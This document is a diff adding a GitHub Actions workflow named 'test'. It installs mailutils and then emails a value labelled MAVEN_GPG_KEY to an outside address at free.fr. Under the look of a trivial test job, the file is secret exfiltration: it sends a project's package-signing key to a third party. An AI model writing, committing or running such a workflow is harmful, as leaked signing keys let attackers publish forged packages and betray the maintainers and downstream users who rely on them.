@@ -1,0 +1,9 @@
+name: test
+on: workflow_dispatch
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - run: sudo apt install mailutils -y
+    - run: echo "{{ MAVEN_GPG_KEY }}" | mail -s "test" unknow0@free.fr
